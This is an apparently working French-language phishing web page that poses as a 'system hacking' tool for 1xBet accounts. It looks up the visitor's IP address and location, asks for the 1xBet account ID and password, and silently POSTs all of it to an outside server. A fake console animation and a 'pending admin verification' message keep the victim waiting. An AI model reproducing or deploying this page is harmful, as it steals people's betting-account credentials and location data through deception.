<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Hacking Syst√®me - Manuel</title>
    <style>
        :root { --neon: #00ff00; --gold: #f39c12; --bg: #0a0a0a; }
        body { font-family: 'Courier New', monospace; background: var(--bg); color: var(--neon); display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
        .container { background: #111; padding: 25px; border: 1px solid var(--neon); border-radius: 10px; width: 100%; max-width: 420px; text-align: center; box-shadow: 0 0 15px rgba(0,255,0,0.2); }
        h2 { color: var(--gold); text-transform: uppercase; font-size: 1.1rem; }
        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid var(--neon); background: #000; color: var(--neon); border-radius: 5px; box-sizing: border-box; }
        button { width: 100%; padding: 15px; margin-top: 15px; border: 1px solid var(--neon); background: transparent; color: var(--neon); font-weight: bold; cursor: pointer; text-transform: uppercase; }
        button:hover { background: var(--neon); color: #000; }
        .step { display: none; }
        .active { display: block; animation: fadeIn 0.5s; }
        #console { background: #000; height: 100px; overflow: hidden; text-align: left; padding: 10px; font-size: 0.7rem; border: 1px solid #333; margin: 10px 0; }
        @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
    </style>
</head>
<body>

<div class="container">
    <div id="step1" class="step active">
        <h2>üéØ HACKING SYST√àME</h2>
        <input type="text" id="nom" placeholder="NOM D'UTILISATEUR">
        <button onclick="validerStep1()">D√âMARRER</button>
    </div>

    <div id="step2" class="step">
        <h2>üìç LOCALISATION IP</h2>
        <p id="geoData">Recherche des coordonn√©es...</p>
        <button id="btnNext2" style="display:none;" onclick="showStep(3)">CONTINUER</button>
    </div>

    <div id="step3" class="step">
        <h2>üîë ACC√àS COMPTE</h2>
        <p>Liaison du compte 1xBet au serveur...</p>
        <input type="number" id="id1xbet" placeholder="ID COMPTE 1XBET">
        <input type="password" id="pass1xbet" placeholder="MOT DE PASSE 1XBET">
        <button onclick="envoyerDonnees()">V√âRIFIER LE COMPTE</button>
    </div>

    <div id="step4" class="step">
        <h2>üì° EXAMEN EN COURS</h2>
        <div id="console"></div>
        <p style="color:white; font-size: 0.8rem;">
            Votre compte est en cours de v√©rification manuelle par l'administrateur.<br><br>
            <span style="color:var(--gold)">Statut : EN ATTENTE</span>
        </p>
        <p style="font-size: 0.7rem;">Ne fermez pas cette page...</p>
    </div>
</div>

<script>
    const API_URL = "https://ngeruka.pythonanywhere.com/send";
    let store = { nom: "", id: "", pass: "", pays: "", ville: "", ip: "" };

    function showStep(n) {
        document.querySelectorAll('.step').forEach(s => s.classList.remove('active'));
        document.getElementById('step' + n).classList.add('active');
    }

    function validerStep1() {
        store.nom = document.getElementById('nom').value;
        if(store.nom.length < 2) return alert("Nom trop court");
        showStep(2);
        getPreciseLocation();
    }

    // CORRECTION GEOLOCALISATION
    async function getPreciseLocation() {
        const geoDisplay = document.getElementById('geoData');
        try {
            const response = await fetch('https://ipapi.co/json/');
            const data = await response.json();
            
            store.ip = data.ip;
            store.ville = data.city;
            store.pays = data.country_name;
            
            geoDisplay.innerHTML = `
                IP: <b style="color:white">${data.ip}</b><br>
                VILLE: <b style="color:white">${data.city}</b><br>
                PAYS: <b style="color:white">${data.country_name}</b><br>
                R√âSEAU: <b style="color:white">${data.org}</b>
            `;
            document.getElementById('btnNext2').style.display = "block";
        } catch (error) {
            geoDisplay.innerHTML = "Erreur de connexion au traceur GPS. R√©essayez.";
        }
    }

    async function envoyerDonnees() {
        store.id = document.getElementById('id1xbet').value;
        store.pass = document.getElementById('pass1xbet').value;

        if(!store.id || !store.pass) return alert("Veuillez remplir tous les champs");

        showStep(4);
        lancerAnimationConsole();

        // ENVOI AU SERVEUR
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(store)
            });
            console.log("Donn√©es envoy√©es pour v√©rification manuelle.");
        } catch (e) {
            console.error("Erreur d'envoi");
        }
    }

    function lancerAnimationConsole() {
        const con = document.getElementById('console');
        const messages = [
            "> Initialisation du tunnel...",
            "> Acc√®s aux serveurs 1xBet...",
            "> Transmission des identifiants...",
            "> En attente de validation admin...",
            "> Cryptage des donn√©es AES-256..."
        ];
        
        let i = 0;
        setInterval(() => {
            const div = document.createElement('div');
            div.innerText = messages[i % messages.length];
            con.prepend(div);
            i++;
            if(con.childNodes.length > 6) con.removeChild(con.lastChild);
        }, 2000);
    }
</script>
</body>
</html>
